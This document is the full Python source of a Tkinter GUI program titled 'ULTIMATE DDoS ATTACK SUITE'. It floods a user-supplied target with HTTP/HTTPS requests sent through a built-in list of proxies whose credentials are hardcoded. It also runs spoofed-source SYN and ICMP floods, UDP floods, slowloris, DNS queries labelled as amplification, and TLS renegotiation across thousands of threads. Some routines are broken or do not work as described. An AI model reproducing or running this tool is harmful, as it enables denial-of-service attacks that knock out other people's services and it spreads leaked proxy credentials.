#!/usr/bin/env python3
import sys
import threading
import time
import random
import socket
import struct
import ipaddress
import tkinter as tk
from tkinter import ttk, scrolledtext, Menu, messagebox, filedialog
from urllib.parse import urlparse
import requests
import base64
import os
import json
import re
import zlib
import ssl
import logging
from concurrent.futures import ThreadPoolExecutor
import dns.resolver

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize theme
class CyberTheme:
    DARK_BG = "#0a0a12"
    DARK_FG = "#e0e0ff"
    ACCENT1 = "#00ffea"
    ACCENT2 = "#ff2a6d"
    ACCENT3 = "#05d9e8"
    HIGHLIGHT = "#d1f7ff"
    WARNING = "#ff9a00"
    CRITICAL = "#ff2a6d"
    SUCCESS = "#39ff14"
    DDoS_COLOR = "#ff5500"
    
    @staticmethod
    def apply_theme(widget):
        try:
            if hasattr(widget, 'configure'):
                options = {}
                if 'background' in widget.keys():
                    options['background'] = CyberTheme.DARK_BG
                elif 'bg' in widget.keys():
                    options['bg'] = CyberTheme.DARK_BG
                if 'foreground' in widget.keys():
                    options['foreground'] = CyberTheme.DARK_FG
                elif 'fg' in widget.keys():
                    options['fg'] = CyberTheme.DARK_FG
                if 'highlightbackground' in widget.keys():
                    options['highlightbackground'] = CyberTheme.ACCENT1
                if 'highlightcolor' in widget.keys():
                    options['highlightcolor'] = CyberTheme.ACCENT1
                if 'insertbackground' in widget.keys():
                    options['insertbackground'] = CyberTheme.HIGHLIGHT
                if options:
                    widget.configure(**options)
        except Exception:
            pass

class DDoSToolUI:
    def __init__(self, master):
        self.master = master
        master.title('⚡ ULTIMATE DDoS ATTACK SUITE')
        master.configure(bg=CyberTheme.DARK_BG)
        
        # Set window size
        screen_width = master.winfo_screenwidth()
        screen_height = master.winfo_screenheight()
        window_width = min(1200, screen_width - 100)
        window_height = min(800, screen_height - 100)
        master.geometry(f"{window_width}x{window_height}+{int((screen_width - window_width)/2)}+{int((screen_height - window_height)/2)}")
        
        # Header
        self.header_frame = tk.Frame(master, bg=CyberTheme.DARK_BG)
        self.header_frame.pack(fill=tk.X, pady=(10, 20))
        
        self.header = tk.Label(
            self.header_frame, 
            text="⚡ ULTIMATE DDoS ATTACK SUITE", 
            font=("Courier", 24, "bold"),
            fg=CyberTheme.DDoS_COLOR,
            bg=CyberTheme.DARK_BG
        )
        self.header.pack(side=tk.LEFT, padx=20)
        
        self.subheader = tk.Label(
            self.header_frame, 
            text="AUTOMATED MULTI-VECTOR DDoS ATTACK TOOL", 
            font=("Courier", 10),
            fg=CyberTheme.ACCENT3,
            bg=CyberTheme.DARK_BG
        )
        self.subheader.pack(side=tk.LEFT, padx=10)
        
        # Main content frame
        self.main_frame = tk.Frame(master, bg=CyberTheme.DARK_BG)
        self.main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        # Left panel - Controls
        self.control_frame = tk.LabelFrame(
            self.main_frame, 
            text="ATTACK CONTROLS", 
            font=("Courier", 10, "bold"),
            fg=CyberTheme.DDoS_COLOR,
            bg=CyberTheme.DARK_BG,
            relief=tk.GROOVE
        )
        self.control_frame.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 10), pady=10)
        
        # Target input
        self.target_frame = tk.Frame(self.control_frame, bg=CyberTheme.DARK_BG)
        self.target_frame.pack(fill=tk.X, pady=5, padx=10)
        
        tk.Label(
            self.target_frame, 
            text="TARGET (URL or IP):", 
            font=("Courier", 9, "bold"),
            fg=CyberTheme.DDoS_COLOR,
            bg=CyberTheme.DARK_BG,
            anchor="w"
        ).pack(fill=tk.X)
        
        self.target_entry = tk.Entry(
            self.target_frame, 
            width=40, 
            font=("Courier", 10),
            bg="#1a1a2e",
            fg=CyberTheme.DARK_FG,
            insertbackground=CyberTheme.HIGHLIGHT,
            highlightthickness=1,
            highlightcolor=CyberTheme.DDoS_COLOR
        )
        self.target_entry.pack(fill=tk.X, pady=(0, 10))
        self.target_entry.insert(0, "http://")
        
        # Attack Power
        tk.Label(
            self.control_frame,
            text="ATTACK POWER (THREADS):",
            font=("Courier", 9, "bold"),
            fg=CyberTheme.DDoS_COLOR,
            bg=CyberTheme.DARK_BG,
            anchor="w"
        ).pack(fill=tk.X, padx=10)
        
        self.attack_power_var = tk.StringVar(value="2000")
        self.attack_power_scale = tk.Scale(
            self.control_frame,
            from_=500, to=10000,
            orient=tk.HORIZONTAL,
            showvalue=True,
            variable=self.attack_power_var,
            bg=CyberTheme.DARK_BG,
            fg=CyberTheme.DDoS_COLOR,
            troughcolor="#1a1a2e",
            highlightthickness=0,
            sliderrelief=tk.RAISED,
            length=200
        )
        self.attack_power_scale.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        # Duration
        tk.Label(
            self.control_frame,
            text="DURATION (seconds):",
            font=("Courier", 9, "bold"),
            fg=CyberTheme.DDoS_COLOR,
            bg=CyberTheme.DARK_BG,
            anchor="w"
        ).pack(fill=tk.X, padx=10)
        
        self.duration_var = tk.StringVar(value="300")
        self.duration_entry = tk.Entry(
            self.control_frame, 
            width=10, 
            font=("Courier", 10),
            bg="#1a1a2e",
            fg=CyberTheme.DARK_FG,
            insertbackground=CyberTheme.HIGHLIGHT,
            highlightthickness=1,
            highlightcolor=CyberTheme.DDoS_COLOR,
            textvariable=self.duration_var
        )
        self.duration_entry.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        # Proxy Section
        self.proxy_frame = tk.LabelFrame(
            self.control_frame, 
            text="PROXY SERVERS", 
            font=("Courier", 9, "bold"),
            fg=CyberTheme.ACCENT3,
            bg=CyberTheme.DARK_BG,
            relief=tk.GROOVE
        )
        self.proxy_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Proxy list text area
        self.proxy_text = scrolledtext.ScrolledText(
            self.proxy_frame,
            height=8,
            wrap=tk.WORD,
            font=("Courier", 8),
            bg="#1a1a2e",
            fg=CyberTheme.ACCENT3,
            insertbackground=CyberTheme.HIGHLIGHT
        )
        self.proxy_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Load default proxies
        default_proxies = """23.95.150.145:6114:gxxilsar:g8ecz9q150t2
198.23.239.134:6540:gxxilsar:g8ecz9q150t2
45.38.107.97:6014:gxxilsar:g8ecz9q150t2
207.244.217.165:6712:gxxilsar:g8ecz9q150t2
107.172.163.27:6543:gxxilsar:g8ecz9q150t2
104.222.161.211:6343:gxxilsar:g8ecz9q150t2
64.137.96.74:6641:gxxilsar:g8ecz9q150t2
216.10.27.159:6837:gxxilsar:g8ecz9q150t2
136.0.207.84:6661:gxxilsar:g8ecz9q150t2
142.147.128.93:6593:gxxilsar:g8ecz9q150t2"""
        self.proxy_text.insert(tk.END, default_proxies)
        
        # Proxy buttons
        proxy_button_frame = tk.Frame(self.proxy_frame, bg=CyberTheme.DARK_BG)
        proxy_button_frame.pack(fill=tk.X, pady=(5, 0))
        
        tk.Button(
            proxy_button_frame, 
            text="Load Proxies", 
            command=self.load_proxies,
            font=("Courier", 8),
            bg=CyberTheme.ACCENT3,
            fg="black",
            width=10
        ).pack(side=tk.LEFT, padx=2)
        
        tk.Button(
            proxy_button_frame, 
            text="Clear Proxies", 
            command=self.clear_proxies,
            font=("Courier", 8),
            bg=CyberTheme.WARNING,
            fg="black",
            width=10
        ).pack(side=tk.LEFT, padx=2)
        
        tk.Button(
            proxy_button_frame, 
            text="Test Proxies", 
            command=self.test_proxies,
            font=("Courier", 8),
            bg=CyberTheme.SUCCESS,
            fg="black",
            width=10
        ).pack(side=tk.RIGHT, padx=2)
        
        # Attack button
        self.attack_button = tk.Button(
            self.control_frame, 
            text="🔥 LAUNCH DDoS ATTACK", 
            command=self.start_attack,
            font=("Courier", 12, "bold"),
            bg=CyberTheme.DDoS_COLOR,
            fg="black",
            activebackground="#ff7700",
            activeforeground="black",
            relief=tk.RAISED,
            borderwidth=3,
            padx=10,
            pady=5
        )
        self.attack_button.pack(pady=20, fill=tk.X, padx=10)
        
        # Stop button
        self.stop_button = tk.Button(
            self.control_frame, 
            text="🛑 STOP ATTACK", 
            command=self.stop_attack,
            font=("Courier", 10, "bold"),
            bg=CyberTheme.CRITICAL,
            fg="black",
            activebackground="#ff5555",
            activeforeground="black",
            state=tk.DISABLED
        )
        self.stop_button.pack(pady=(0, 10), fill=tk.X, padx=10)
        
        # Stats frame
        self.stats_frame = tk.Frame(self.control_frame, bg=CyberTheme.DARK_BG)
        self.stats_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        stats_labels = ["REQUESTS SENT", "BYTES SENT", "ATTACK TIME", "ACTIVE THREADS"]
        self.stats_vars = {}
        for label in stats_labels:
            frame = tk.Frame(self.stats_frame, bg=CyberTheme.DARK_BG)
            frame.pack(fill=tk.X, pady=2)
            
            lbl = tk.Label(
                frame, 
                text=f"{label}:", 
                font=("Courier", 8),
                fg=CyberTheme.ACCENT3,
                bg=CyberTheme.DARK_BG,
                width=15,
                anchor="w"
            )
            lbl.pack(side=tk.LEFT)
            
            var = tk.StringVar(value="0")
            self.stats_vars[label.lower().replace(" ", "_")] = var
            
            val = tk.Label(
                frame, 
                textvariable=var, 
                font=("Courier", 9, "bold"),
                fg=CyberTheme.HIGHLIGHT,
                bg=CyberTheme.DARK_BG,
                anchor="e"
            )
            val.pack(side=tk.RIGHT)
        
        # Right panel - Results
        self.results_frame = tk.LabelFrame(
            self.main_frame, 
            text="ATTACK CONSOLE", 
            font=("Courier", 10, "bold"),
            fg=CyberTheme.DDoS_COLOR,
            bg=CyberTheme.DARK_BG,
            relief=tk.GROOVE
        )
        self.results_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        
        # Results text
        self.results_text = scrolledtext.ScrolledText(
            self.results_frame,
            wrap=tk.WORD,
            font=("Courier", 9),
            bg="#0f0f1f",
            fg=CyberTheme.DDoS_COLOR,
            insertbackground=CyberTheme.HIGHLIGHT
        )
        self.results_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Status bar
        self.status_frame = tk.Frame(master, bg="#050510", height=25)
        self.status_frame.pack(fill=tk.X, side=tk.BOTTOM)
        
        self.status_var = tk.StringVar()
        self.status_var.set("🟢 READY")
        tk.Label(
            self.status_frame, 
            textvariable=self.status_var, 
            font=("Courier", 9),
            bg="#050510",
            fg=CyberTheme.SUCCESS,
            anchor="w",
            padx=10
        ).pack(fill=tk.X)
        
        # DDoS Attacker instance
        self.ddos_attacker = DDoSAttacker(
            self.update_status,
            self.add_attack_log,
            self.update_stats
        )
        
        # Apply theme
        self.apply_theme()
        
    def apply_theme(self):
        CyberTheme.apply_theme(self.master)
        all_widgets = [self.master]
        while all_widgets:
            widget = all_widgets.pop()
            try:
                CyberTheme.apply_theme(widget)
                all_widgets.extend(widget.winfo_children())
            except Exception:
                continue
    
    def load_proxies(self):
        filename = filedialog.askopenfilename(title="Select Proxy List", 
                                              filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
        if filename:
            try:
                with open(filename, 'r') as f:
                    proxies = f.read()
                self.proxy_text.delete(1.0, tk.END)
                self.proxy_text.insert(tk.END, proxies)
                self.update_status(f"✅ Loaded proxies from {filename}", "success")
            except Exception as e:
                self.update_status(f"❌ Failed to load proxies: {str(e)}", "error")
    
    def clear_proxies(self):
        self.proxy_text.delete(1.0, tk.END)
        self.update_status("✅ Proxy list cleared", "success")
    
    def test_proxies(self):
        proxy_text = self.proxy_text.get(1.0, tk.END).strip()
        if not proxy_text:
            self.update_status("❌ No proxies to test", "error")
            return
            
        proxies = [p.strip() for p in proxy_text.splitlines() if p.strip()]
        self.update_status(f"Testing {len(proxies)} proxies...", "info")
        
        # Start testing in a new thread
        test_thread = threading.Thread(
            target=self.test_proxy_list,
            args=(proxies,),
            daemon=True
        )
        test_thread.start()
    
    def test_proxy_list(self, proxies):
        working_proxies = []
        proxy_lines = self.proxy_text.get(1.0, tk.END).splitlines()
        
        for i, proxy_line in enumerate(proxy_lines):
            if not proxy_line.strip():
                continue
                
            try:
                ip, port, user, pwd = proxy_line.split(':')
                proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
                
                response = requests.get(
                    "http://httpbin.org/ip",
                    proxies={"http": proxy_url, "https": proxy_url},
                    timeout=10
                )
                
                if response.status_code == 200:
                    working_proxies.append(proxy_line)
                    self.add_attack_log(f"✅ Proxy {ip}:{port} is WORKING")
                else:
                    self.add_attack_log(f"❌ Proxy {ip}:{port} failed: HTTP {response.status_code}")
            except Exception as e:
                self.add_attack_log(f"❌ Proxy {proxy_line} failed: {str(e)}")
        
        # Update proxy list with working proxies
        self.proxy_text.delete(1.0, tk.END)
        self.proxy_text.insert(tk.END, "\n".join(working_proxies))
        self.update_status(f"✅ Proxy test completed: {len(working_proxies)}/{len(proxies)} working", "success")
    
    def start_attack(self):
        target = self.target_entry.get().strip()
        if not target or target == "http://":
            self.update_status("❌ ERROR: Please enter a target URL", "error")
            return
            
        try:
            attack_power = int(self.attack_power_var.get())
            duration = int(self.duration_var.get())
        except:
            self.update_status("❌ ERROR: Attack power and duration must be numbers", "error")
            return
            
        # Get proxies
        proxy_text = self.proxy_text.get(1.0, tk.END).strip()
        proxies = [p.strip() for p in proxy_text.splitlines() if p.strip()]
        
        # Clear results
        self.results_text.delete(1.0, tk.END)
        
        # Disable attack button, enable stop button
        self.attack_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        
        # Start attack in a new thread
        attack_thread = threading.Thread(
            target=self.ddos_attacker.launch_attack,
            args=(target, attack_power, duration, proxies),
            daemon=True
        )
        attack_thread.start()
    
    def stop_attack(self):
        self.ddos_attacker.stop_event.set()
        self.update_status("🛑 Attack stopping...", "warning")
        self.stop_button.config(state=tk.DISABLED)
    
    def update_status(self, message, level="info"):
        colors = {
            "info": CyberTheme.ACCENT3,
            "success": CyberTheme.SUCCESS,
            "warning": CyberTheme.WARNING,
            "error": CyberTheme.CRITICAL,
            "ddos": CyberTheme.DDoS_COLOR
        }
        
        prefix = {
            "info": "ℹ️",
            "success": "✅",
            "warning": "⚠️",
            "error": "❌",
            "ddos": "🌩️"
        }
        
        self.status_var.set(f"{prefix.get(level, '')} {message}")
        self.master.update_idletasks()
    
    def add_attack_log(self, log):
        self.results_text.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {log}\n")
        self.results_text.see(tk.END)
        self.master.update_idletasks()
    
    def update_stats(self, stats):
        for key, value in stats.items():
            if key in self.stats_vars:
                self.stats_vars[key].set(str(value))
        self.master.update_idletasks()

class DDoSAttacker:
    def __init__(self, status_callback, log_callback, stats_callback):
        self.status_callback = status_callback
        self.log_callback = log_callback
        self.stats_callback = stats_callback
        self.stop_event = threading.Event()
        self.attack_stats = {
            "requests_sent": 0,
            "bytes_sent": 0,
            "attack_time": 0,
            "active_threads": 0
        }
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
        ]
        
    def launch_attack(self, target, attack_power, duration, proxies):
        try:
            self.stop_event.clear()
            self.attack_stats = {
                "requests_sent": 0,
                "bytes_sent": 0,
                "attack_time": 0,
                "active_threads": 0
            }
            
            self.status_callback(f"🌩️ Launching multi-vector attack on {target} with {attack_power} threads", "ddos")
            self.log_callback(f"Attack started at {time.strftime('%Y-%m-%d %H:%M:%S')}")
            self.log_callback(f"Attack power: {attack_power} threads")
            self.log_callback(f"Duration: {duration} seconds")
            self.log_callback(f"Proxies: {len(proxies)} loaded")
            
            # Parse target
            parsed_target = urlparse(target)
            scheme = parsed_target.scheme or 'http'
            host = parsed_target.hostname
            port = parsed_target.port or (80 if scheme == 'http' else 443)
            path = parsed_target.path if parsed_target.path else '/'
            
            # Resolve host to IP if needed
            try:
                ip_address = socket.gethostbyname(host)
                self.log_callback(f"Resolved {host} to IP: {ip_address}")
            except:
                ip_address = host
                self.log_callback(f"Using target as IP: {host}")
            
            # Create proxy rotation
            proxy_cycle = self.create_proxy_cycle(proxies)
            
            # Start stats updater
            threading.Thread(target=self.update_stats_thread, daemon=True).start()
            
            # Create worker threads
            threads = []
            for i in range(attack_power):
                thread = threading.Thread(
                    target=self.mixed_attack_worker,
                    args=(host, ip_address, port, path, proxy_cycle),
                    daemon=True
                )
                thread.start()
                threads.append(thread)
                self.attack_stats['active_threads'] += 1
            
            # Run for the specified duration
            time.sleep(duration)
            self.stop_event.set()
            
            # Wait for threads to finish
            for thread in threads:
                thread.join(timeout=5)
                
            # Calculate duration
            attack_duration = time.time() - start_time
            self.log_callback(f"Attack completed in {attack_duration:.2f} seconds")
            self.log_callback(f"Total requests: {self.attack_stats['requests_sent']}")
            self.log_callback(f"Total data sent: {self.attack_stats['bytes_sent'] / (1024*1024):.2f} MB")
            self.status_callback(f"✅ Attack completed: {self.attack_stats['requests_sent']} requests sent", "success")
        except Exception as e:
            self.status_callback(f"❌ Attack failed: {str(e)}", "error")
        finally:
            self.attack_stats['active_threads'] = 0
            self.stats_callback(self.attack_stats)
    
    def create_proxy_cycle(self, proxies):
        """Create a cycle of proxy dictionaries for requests"""
        proxy_list = []
        for proxy_line in proxies:
            if not proxy_line.strip():
                continue
            try:
                parts = proxy_line.split(':')
                if len(parts) == 4:
                    ip, port, user, pwd = parts
                    proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
                    proxy_list.append({
                        'http': proxy_url,
                        'https': proxy_url
                    })
                elif len(parts) == 2:
                    ip, port = parts
                    proxy_url = f"http://{ip}:{port}"
                    proxy_list.append({
                        'http': proxy_url,
                        'https': proxy_url
                    })
            except:
                continue
        
        # Cycle through proxies
        while True:
            for proxy in proxy_list:
                yield proxy
            if not proxy_list:
                yield None
    
    def update_stats_thread(self):
        """Thread to update attack time continuously"""
        start_time = time.time()
        while not self.stop_event.is_set() and self.attack_stats['active_threads'] > 0:
            self.attack_stats['attack_time'] = int(time.time() - start_time)
            self.stats_callback(self.attack_stats)
            time.sleep(1)
    
    def mixed_attack_worker(self, host, ip_address, port, path, proxy_cycle):
        """Worker thread that performs all attack types"""
        attack_methods = [
            lambda: self.http_flood(host, port, path, proxy_cycle),
            lambda: self.https_flood(host, port, path, proxy_cycle),
            lambda: self.syn_flood(ip_address, port),
            lambda: self.udp_flood(ip_address, port),
            lambda: self.slowloris(host, port),
            lambda: self.icmp_flood(ip_address),
            lambda: self.dns_amplification(ip_address),
            lambda: self.ssl_renegotiation(host, port)
        ]
        
        while not self.stop_event.is_set():
            try:
                # Randomly select an attack method
                attack_method = random.choice(attack_methods)
                attack_method()
                
                # Short delay between attacks
                time.sleep(0.01)
            except Exception as e:
                # Continue even if one method fails
                pass
    
    def http_flood(self, host, port, path, proxy_cycle):
        """HTTP Flood attack with proxy rotation"""
        try:
            proxy = next(proxy_cycle)
            session = requests.Session()
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }
            
            url = f"http://{host}:{port}{path}"
            response = session.get(
                url,
                headers=headers,
                proxies=proxy,
                timeout=5,
                verify=False,
                stream=True
            )
            
            # Count bytes sent
            content_length = len(response.content) if response.content else 0
            self.attack_stats['requests_sent'] += 1
            self.attack_stats['bytes_sent'] += content_length
            
        except Exception as e:
            # Ignore errors and continue
            pass
    
    def https_flood(self, host, port, path, proxy_cycle):
        """HTTPS Flood attack with proxy rotation"""
        try:
            proxy = next(proxy_cycle)
            session = requests.Session()
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }
            
            url = f"https://{host}:{port}{path}"
            response = session.get(
                url,
                headers=headers,
                proxies=proxy,
                timeout=5,
                verify=False,
                stream=True
            )
            
            # Count bytes sent
            content_length = len(response.content) if response.content else 0
            self.attack_stats['requests_sent'] += 1
            self.attack_stats['bytes_sent'] += content_length
            
        except Exception as e:
            # Ignore errors and continue
            pass
    
    def syn_flood(self, ip_address, port):
        """SYN Flood attack"""
        try:
            # Create raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # Craft SYN packet
            packet = self._craft_syn_packet(ip_address, port)
            sock.sendto(packet, (ip_address, port))
            
            # Count bytes sent
            self.attack_stats['requests_sent'] += 1
            self.attack_stats['bytes_sent'] += len(packet)
            
            sock.close()
        except:
            pass
    
    def _craft_syn_packet(self, target_ip, target_port):
        """Craft a SYN packet"""
        # Random source IP
        src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
        
        # IP header
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(target_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        # IP header structure
        ip_header = struct.pack('!BBHHHBBH4s4s', 
                               ip_ihl_ver, ip_tos, ip_tot_len, 
                               ip_id, ip_frag_off, ip_ttl, 
                               ip_proto, ip_check, ip_saddr, ip_daddr)
        
        # TCP header
        tcp_source = random.randint(1024, 65535)
        tcp_dest = target_port
        tcp_seq = random.randint(0, 4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
        
        # TCP header structure
        tcp_header = struct.pack('!HHLLBBHHH', 
                                tcp_source, tcp_dest, tcp_seq, 
                                tcp_ack_seq, tcp_offset_res, tcp_flags, 
                                tcp_window, tcp_check, tcp_urg_ptr)
        
        # Pseudo header for checksum
        source_address = socket.inet_aton(src_ip)
        dest_address = socket.inet_aton(target_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        
        psh = struct.pack('!4s4sBBH', 
                         source_address, dest_address, 
                         placeholder, protocol, tcp_length)
        psh = psh + tcp_header
        
        # Calculate checksum
        tcp_check = self._checksum(psh)
        tcp_header = struct.pack('!HHLLBBHHH', 
                                tcp_source, tcp_dest, tcp_seq, 
                                tcp_ack_seq, tcp_offset_res, tcp_flags, 
                                tcp_window, tcp_check, tcp_urg_ptr)
        
        # Final packet
        packet = ip_header + tcp_header
        return packet
    
    def _checksum(self, data):
        """Calculate checksum for packets"""
        s = 0
        for i in range(0, len(data), 2):
            if i + 1 < len(data):
                w = (data[i] << 8) + data[i + 1]
                s += w
            else:
                s += data[i] << 8
        
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return socket.htons(s)
    
    def udp_flood(self, ip_address, port):
        """UDP Flood attack"""
        try:
            # Create UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Generate random data
            data = os.urandom(1024)
            sock.sendto(data, (ip_address, port))
            
            # Count bytes sent
            self.attack_stats['requests_sent'] += 1
            self.attack_stats['bytes_sent'] += len(data)
            
            sock.close()
        except:
            pass
    
    def slowloris(self, host, port):
        """Slowloris attack - open and maintain multiple connections"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            s.send(f"GET / HTTP/1.1\r\n".encode())
            s.send(f"Host: {host}\r\n".encode())
            s.send("User-Agent: {}\r\n".format(random.choice(self.user_agents)).encode())
            s.send("Content-length: 42\r\n".encode())
            
            # Keep connection alive
            while not self.stop_event.is_set():
                try:
                    s.send("X-a: b\r\n".encode())
                    self.attack_stats['bytes_sent'] += 10
                    time.sleep(15)
                except:
                    break
            
            s.close()
        except:
            pass
    
    def icmp_flood(self, ip_address):
        """ICMP Ping Flood attack"""
        try:
            # Create raw socket for ICMP
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # Craft ICMP packet
            packet = self._craft_icmp_packet(ip_address)
            sock.sendto(packet, (ip_address, 0))
            
            # Count bytes sent
            self.attack_stats['requests_sent'] += 1
            self.attack_stats['bytes_sent'] += len(packet)
            
            sock.close()
        except:
            pass
    
    def _craft_icmp_packet(self, target_ip):
        """Craft an ICMP echo request packet"""
        # IP header
        src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
        
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_ICMP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(target_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        ip_header = struct.pack('!BBHHHBBH4s4s', 
                               ip_ihl_ver, ip_tos, ip_tot_len, 
                               ip_id, ip_frag_off, ip_ttl, 
                               ip_proto, ip_check, ip_saddr, ip_daddr)
        
        # ICMP header
        icmp_type = 8  # ICMP Echo Request
        icmp_code = 0
        icmp_checksum = 0
        icmp_id = random.randint(0, 65535)
        icmp_seq = random.randint(0, 65535)
        icmp_data = os.urandom(48)  # Random data
        
        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        
        # Calculate ICMP checksum
        icmp_checksum = self._checksum(icmp_header + icmp_data)
        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        
        return ip_header + icmp_header + icmp_data
    
    def dns_amplification(self, ip_address):
        """DNS Amplification attack using open resolvers"""
        # List of open DNS resolvers
        dns_servers = [
            "8.8.8.8", "8.8.4.4", "9.9.9.9", "1.1.1.1",
            "208.67.222.222", "208.67.220.220", "64.6.64.6",
            "64.6.65.6", "84.200.69.80", "84.200.70.40"
        ]
        
        try:
            # Create UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            
            # Craft DNS query for a large response
            dns_query = self._craft_dns_query(ip_address)
            
            # Send to random DNS server
            dns_server = random.choice(dns_servers)
            sock.sendto(dns_query, (dns_server, 53))
            
            # Count bytes sent
            self.attack_stats['requests_sent'] += 1
            self.attack_stats['bytes_sent'] += len(dns_query)
            
            sock.close()
        except:
            pass
    
    def _craft_dns_query(self, target_ip):
        """Craft a DNS query for amplification"""
        # DNS header
        transaction_id = os.urandom(2)
        flags = b'\x01\x00'  # Standard query, recursion desired
        questions = b'\x00\x01'  # One question
        answer_rrs = b'\x00\x00'
        authority_rrs = b'\x00\x00'
        additional_rrs = b'\x00\x00'
        
        # DNS question
        # Query for isc.org which often returns large responses
        qname = b'\x03' + b'isc' + b'\x03' + b'org' + b'\x00'
        qtype = b'\x00\x0c'  # PTR query
        qclass = b'\x00\x01'  # Internet class
        
        return transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + qname + qtype + qclass
    
    def ssl_renegotiation(self, host, port):
        """SSL/TLS Renegotiation attack"""
        try:
            # Create SSL context
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Create socket and wrap in SSL
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            ssl_sock = context.wrap_socket(sock, server_hostname=host)
            ssl_sock.connect((host, port))
            
            # Send Client Hello to initiate handshake
            ssl_sock.write(b"\x16\x03\x01\x00\xcc\x01\x00\x00\xc8\x03\x03")
            
            # Request renegotiation
            ssl_sock.write(b"\x16\x03\x01\x00\x04\x0e\x00\x00\x00")
            self.attack_stats['requests_sent'] += 1
            self.attack_stats['bytes_sent'] += 9
            
            ssl_sock.close()
        except:
            pass

# Main execution
if __name__ == "__main__":
    root = tk.Tk()
    app = DDoSToolUI(root)
    root.mainloop()
